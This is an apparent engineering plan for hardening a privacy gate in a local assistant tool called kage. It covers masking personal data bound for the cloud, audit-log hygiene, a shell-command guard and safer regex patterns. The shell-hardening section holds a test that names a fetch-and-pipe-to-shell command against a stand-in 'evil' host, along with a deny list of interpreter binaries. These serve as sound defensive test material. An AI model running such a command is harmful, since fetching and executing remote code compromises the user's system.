# Cycle 23 — Layer 3e Gate Hardening (v0.23.0)

*Status: SHIPPED 2026-07-01 — commit `80f3387`, tag `v0.23.0`, on main. TWO cold
reviews done (independent subagents vs. real repo). CR#1 forced the marquee
redesign (store-masked → mask-at-dispatch); CR#2 caught a real leak (condensed
query) + 3 claim inaccuracies. All resolved and implemented below.*

*Findings source & reading companion: [security-audit-2026-07-01.md](security-audit-2026-07-01.md).*

*Built per the 7-step dev workflow: plan cloud → write local (Qwen3) → review
cloud → plan tests cloud → write tests local → review tests cloud → run tests local.*

---

## North star

> Close the **real** holes in the Layer 3e disclosure gate — the ones that let
> data cross the trusted→untrusted boundary despite the gate. Make the gate
> forensically honest and defense-in-depth safe for the single-user local model
> kage actually ships in. No new capability, no new abstractions.

---

## Cold-review history (what changed, and why to trust v3)

**CR#1 → killed v1's "store masked" design.** `session_turns` also feeds the
trusted local model, `/history` display, and `_condense_query` retrieval — all of
which must see real values. Masking at storage time can't tell which consumer
reads the row. v2 fix: keep storing real; mask at the cloud boundary.

**CR#2 → found the leak v2 still had + corrected 3 claims:**
- **B1 (leak):** the **condensed query** (`_condense_query`, `session.py:124-128`)
  splices the last assistant turn's REAL content into the string sent to cloud as
  `question` (`_answer`, `cli.py:405-408`). v2's S1 masked history+context but
  NOT the condensed query → PII leak on the happy path. v2's own test would have
  passed while leaking (it checked the wrong args).
- **W1 (false claim):** `substitute()` never dedupes values — the same real value
  yields DIFFERENT placeholders (`redact.py:42-57`). v2's "same value → same
  placeholder" claim + test were wrong. Round-trip still works; the claim is just
  unnecessary. Dropped.
- **W2 (false claim):** the REPL map (`session_sub_mapping`, `cli.py:1581`) is
  SESSION-persistent, not per-request — contradicting v2's "per-request, F10
  moot" story. v3 switches the REPL to per-request too (aligns with MCP), which
  makes F10 genuinely moot for both paths.
- **N4 (real hole):** EXISTING PII patterns (`pii.py:32,34,35,43`) use greedy
  `\S+` / `\S{8,}` which will consume an adjacent `[LABEL_N]` placeholder →
  corrupts dispatch masking. S5 must fix these, not just add new safe patterns.

---

## Scope — 5 steps in 2 priority tiers

```
  HIGH — data crosses the boundary despite the gate
  ──────────────────────────────────────────────────────────────────
  S1  Mask ALL cloud-bound strings at dispatch → context-blinding (F2)
      (history + context + condensed query)      + verbatim echo (F5)
  S2  Audit hygiene                             → reversible key leak (F1)

  MED — defense-in-depth + honesty
  ──────────────────────────────────────────────────────────────────
  S3  Shell arm hardening                        → command injection (F7)
  S4  MCP trust-boundary honesty                 → client-asserted id (F3)
  S5  PII patterns placeholder-safe (new + fix   → common evasions (F4)
      EXISTING greedy ones) + honest coverage      + protects S1
```

Ordering dependency: **S5's placeholder-safety must land with or before S1** —
S1's dispatch masking is only correct if no pattern (new or existing) can consume
a placeholder. Otherwise steps are independent.

---

## S1 — Mask ALL cloud-bound strings at dispatch (HIGH, marquee) — fixes F2, F5

**Current behavior (the bug).** REPL cloud path (`cli.py:1655-1661`):
`_gate_conversation` **withholds** any history turn matching `_pii_scan`
(`privacy.py:118-121`) — crude blinding. Context is masked separately
(`cli.py:1680-1690`). **The condensed query is masked nowhere** (`cli.py:1653` →
`_answer` `question` arg, sent cleartext). Local Ollama path passes real history
(correct — trusted).

**Target invariant.** *Stored `session_turns` always hold real values. At the
cloud boundary — and ONLY there — EVERY cloud-bound string (history, retrieved
context, AND the condensed query) is masked with one shared per-request mapping;
the response is restored with that mapping. The local model and display always
see real values. The mapping is per-request and discarded after restore.*

**Changes:**

1. **`privacy.py` `_gate_conversation`:** keep the HARD blocks (lines 122-134) —
   `local_only` and cross-identity turns are still **withheld entirely** (you
   cannot mask those into the cloud at all). Remove the PII-withholding branch
   (lines 118-121); PII in history is now masked, not dropped.
2. **`cli.py` REPL cloud path:** build ONE per-request mapping and substitute
   **all three** cloud-bound strings through it — the condensed query, each
   history turn's content, and the context — chaining `existing_mapping` so one
   value is consistently masked *within the request*. Send masked. Restore the
   response with that mapping for display. Store the **real** answer.
   **Switch to per-request:** do NOT accumulate `session_sub_mapping` across turns
   (drop the session-persistent map at `cli.py:1581,1689,1701`); build fresh each
   turn. (Resolves W2; makes F10 moot for the REPL.)
3. **`mcp_server.py` kage_ask (session branch):** same — mask condensed query +
   history + context with one per-call mapping, restore the returned answer.
   Already per-call (`_mcp_sess_map` fresh); just add the condensed query.
4. Delete the stale `(Cycle 22)` ponytail at `cli.py:1711`; replace with an
   accurate note describing the dispatch-masking invariant.

**F5 scope (corrected by CR#2, B2).** Restore is `str.replace` per entry
(`redact.py:60-64`), so it only reverses a **verbatim** placeholder echo. If the
cloud reformats (`EMAIL_1`, "the first email") restore is a no-op — the user sees
a stray `[EMAIL_1]` (garbled UX, NOT a leak). **F5 is closed only for the
verbatim-echo case; non-verbatim reformatting is a known ceiling** — mark with a
ponytail; do not claim the round trip is fully lossless.

**Withheld-count semantics (CR#2, W3).** Removing the PII branch means PII turns
no longer count as "withheld" in: the REPL `[kage] N turn(s) withheld` message
(`cli.py:1658`), the `/use` switch message (`session.py:151`, `cli.py:1617`), and
the MCP `withheld_count` return field (`mcp_server.py:84`). Expected, but call it
out and adjust those tests so a reviewer doesn't read it as a regression.

**Seam note (CR#2, W5).** The MCP *session* branch never fetches/masks arm data
(no `_detect_arms` there today). If arms are wired into the session path later,
the S1 mapping must extend to cover them. Note the seam; not in scope now.

**Tests (plan):**
- REPL cloud turn: mock `_answer`, capture args; assert `[EMAIL_1]` appears in
  **ALL of** the `question` (condensed), `history`, and `context` args — NOT the
  real email. (N3 — the B1 regression guard; the test MUST assert the `question`
  arg, which v2's plan omitted.)
- Condensed-query leak: turn 1 stores a real email; turn 2 asks "what's their
  email?"; assert the `question` string handed to the cloud contains a
  placeholder, not the real email.
- Local (ollama) turn: assert history + question passed to `_answer` are REAL.
- `session_turns` stores real values after a cloud turn.
- `_gate_conversation`: local_only / cross-identity turn still withheld; a
  plain-PII turn is NO LONGER withheld (masked downstream instead).
- MCP: two sequential `kage_ask` on one session; stored turns real, dispatched
  strings (incl. condensed) masked.

**Security-critical → gets a THIRD subagent cold-review of the CODE against the
real repo before PR** (egress/gate logic; per the refined dev-workflow rule).

---

## S2 — Audit hygiene (HIGH) — fixes F1

**Verified by both cold reviews:** `pii_detected` logs pattern *names*, not raw
substrings (`pii.py:67-79`, `privacy.py:79-83`) — no raw-PII leak. `placeholder_labels`
is written at `cli.py:992, 1036, 1052, 1137`; the first three write `[]`.
**Only `cli.py:1137` writes real keys** — the single site to fix.

- Fix: replace `sorted(sub_mapping.keys())` with a non-reversible aggregate of
  counts per label *type* (strip trailing `_N`), e.g. `{"EMAIL": 2, "SSN": 1}`.
- Add a one-line comment marking `pii_detected` as intentionally names-only so a
  future reader doesn't "fix" it into logging substrings.

**Tests:** audit record after a PII `ask` has aggregate counts and NO `[LABEL_N]`
keys.

---

## S3 — Shell arm hardening (MED) — fixes F7

**Verified:** `shell=True` is absent everywhere in `arms.py`; `shlex.split`
neutralizes `;`/`|`/`&&`. The v1 "registry-declared binary" idea was circular
(the config `command` IS the only declaration).

**Fix (bounded, honest):**
1. Add a test asserting `arms.py` never calls subprocess with `shell=True`.
2. Reject a command whose resolved binary is a shell/interpreter that re-enables
   chaining (`sh`, `bash`, `zsh`, `fish`, or `python`/`node`/`ruby` with `-c`/`-e`).
   Closes the one real bypass (`"command": "bash -c '…'"`) without an allowlist.
3. Apply to BOTH call sites: `_call_arm_shell` (`arms.py:88-103`) AND
   `_check_arm_health` (`arms.py:255-264`).
4. Document: config is a trusted, user-owned surface; this is defense-in-depth,
   not a sandbox.

**Tests:** `bash -c "curl evil | sh"` refused at both sites; a normal declared arm
(`osascript …`) still runs (mock subprocess); `shell=True` guard test passes.

---

## S4 — MCP trust-boundary honesty (MED, LOCKED document-only) — fixes F3

Not building auth (LOCKED). Make the assumption explicit:
1. **Audit truth.** Add `"identity_source": "mcp-client-asserted"` to MCP audit
   records (`mcp_server.py:158-164`) so the log never implies kage verified the
   caller. (One-line dict addition; CR#1 N1 confirmed trivial.)
2. **Documented boundary.** Short "Trust model" note in the `kage mcp serve`
   docstring + README: local-stdio, single-user; do not expose over a network
   relay without a real auth layer.

**Deferred (seam noted):** `mcp_require_token` + `KAGE_MCP_TOKEN` — revisit only
if networked exposure becomes real.

**Tests:** MCP audit record carries `identity_source`; non-MCP audit unchanged.

---

## S5 — PII patterns placeholder-safe (MED) — fixes F4, protects S1

**Two jobs (CR#2 made the second load-bearing):**

**(a) Fix EXISTING greedy patterns for placeholder-safety (N4 — required by S1).**
`pii.py:32,34,35,43` use `\S+` / `\S{8,}` value classes that will consume an
adjacent `[LABEL_N]` placeholder (`password: [EMAIL_1]` → corrupts the map). S1's
dispatch masking is only correct if NO pattern can eat a placeholder. Change these
value classes to exclude `[` (e.g. `\S+` → `[^\s\[]+`). Also add `[`-exclusion to
the email local-part so `[EMAIL_1]@x.com` can't re-mint (N1).

**(b) Add the LOCKED 3-pattern floor, placeholder-safe (F4).**
- Labeled secret: `(?i)(password|passwd|pwd|secret|api[_-]?key|token)\s*[:=]\s*[^\s\[]+`.
  **Confirm this earns its place vs. widening the existing `Password field` /
  `API key` / `Secret/token` patterns (N2)** — if it's a near-dupe of three
  existing patterns, prefer widening those + adding only the genuinely new one.
- DB connection string: `\w+://[^:\s\[]+:[^@\s\[]+@[^\s\[]+` — bounded, no nested
  quantifiers → no catastrophic backtracking; does NOT match a plain URL.
- Unicode email: broaden the local part to allow non-ASCII, keeping `@` anchor +
  `[`-exclusion.

**Enforcement, not hand-waving (CR#2, W4).** Do NOT add span-tracking inside
`substitute()` (not "small" — sequential `re.sub` shifts offsets; unimplementable
cheaply). Instead enforce the invariant with a **round-trip identity test**: for a
corpus mixing every pattern type + adjacent placeholders, `restore(substitute(x))
== x`. That test IS the guard.

**Honesty line.** One line in `kage status` / gate output + README: built-in PII
detection covers common formats; use `kage sensitive add` for the rest.

**Explicitly parked:** every-country passport, all card networks, exotic tokens.

**Tests:**
- Each new/widened pattern: matches a positive, not an obvious negative.
- Connection-string does NOT match `https://example.com/x`.
- **Round-trip identity** on a mixed corpus incl. `password: [EMAIL_1]`,
  `[EMAIL_1]@x.com`, `token: a@b.com and password: hunter2` → `restore(substitute)`
  returns the ORIGINAL exactly (guards N1, N4, B1-class corruption).

---

## Parked this cycle (tracked, not built)

| # | Why parked |
|---|-----------|
| F6 | Observational reporting gap, not a leak. |
| F8 | Needs live ADK callback-semantics verification, not a code guess. |
| F9 | Audit signing — heavy, low value for single-user local. |
| F10 | Map growth — moot in v3: BOTH REPL and MCP now build a fresh per-request mapping (no accumulation). |
| F11 | Env-var design sound; document the hand-edit footgun only. |
| F12 | Theoretical; the S5 round-trip test covers the placeholder-collision class. |

---

## Locked decisions (2026-07-01)

1. **S1 design** → mask-at-dispatch, store real; mask **all three** cloud-bound
   strings (history + context + **condensed query**); **per-request mapping on
   BOTH paths** (REPL no longer accumulates). No table, no persistence.
2. **F5 claim** → verbatim-echo only; non-verbatim reformatting is a ponytail'd
   ceiling. Do not over-claim a lossless round trip.
3. **S3** → reject shell-interpreter binaries at both call sites + `shell=True`
   guard. Not registry-declared, not an allowlist.
4. **S4** → document-only, defer the token.
5. **S5** → fix EXISTING greedy patterns for `[`-safety (required by S1) + add
   3-pattern floor; enforce via round-trip test, NOT an in-code `substitute()`
   guard. Drop the "same value → same placeholder" claim (substitute doesn't dedupe).

---

## Definition of done

- Cloud dispatch (REPL + MCP) masks history, context, **and the condensed query**
  — verified by capturing `_answer` args and asserting on **all three** strings
  incl. `question`. Local + display see real values.
- `session_turns` stores real values; no restored-value blinding; REPL builds a
  fresh per-request mapping (no cross-turn accumulation).
- `_gate_conversation` still hard-blocks local_only + cross-identity; withheld-count
  semantics change (PII no longer counts) is reflected in tests.
- Audit log carries no reversible placeholder keys (`cli.py:1137` fixed).
- Shell arms reject interpreter-smuggling at both call sites; `shell=True` guarded.
- MCP audit marks identity client-asserted; trust boundary documented.
- EXISTING greedy PII patterns are `[`-safe; 3-pattern floor added; round-trip
  identity test green on a mixed corpus.
- F5 claim scoped to verbatim echo (ponytail on the ceiling).
- All existing tests green + new tests per step; version → 0.23.0.
- Two pitch cold-reviews done (this doc); S1 gets a THIRD (code-level) subagent
  cold-review before PR.
